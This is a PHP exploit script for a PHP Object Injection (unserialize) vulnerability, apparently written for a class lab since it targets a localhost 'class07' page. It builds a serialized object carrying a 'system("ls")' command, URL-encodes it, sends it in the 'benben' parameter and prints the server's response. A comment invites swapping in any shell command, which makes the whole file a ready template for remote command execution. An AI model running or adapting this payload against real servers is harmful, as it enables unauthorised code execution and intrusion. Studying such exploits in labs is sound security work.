<?php
/**
 * PHP Unserialize Vulnerability Exploit Script
 * Generates a serialized object payload for PHP Object Injection.
 */

class User {
    // Modify this command to the desired shell command
    public $cmd = 'system("ls");';
}

// 1. Create the malicious object
$malicious_user = new User();

// 2. Serialize and URL encode the payload
$payload = serialize($malicious_user);
$encoded_payload = urlencode($payload);

// 3. Target configuration
$target_url = "http://localhost:8002/class07/3.php";
$full_url = $target_url . "?benben=" . $encoded_payload;

echo "[*] Serialized Payload: " . $payload . "\n";
echo "[*] Target URL: " . $full_url . "\n\n";

// 4. Send the request
echo "[*] Sending request...\n";
$response = @file_get_contents($full_url);

if ($response !== false) {
    echo "--- Server Response ---\n";
    echo $response;
    echo "\n-----------------------\n";
} else {
    echo "[!] Error: Could not connect to the target server.\n";
}
?>
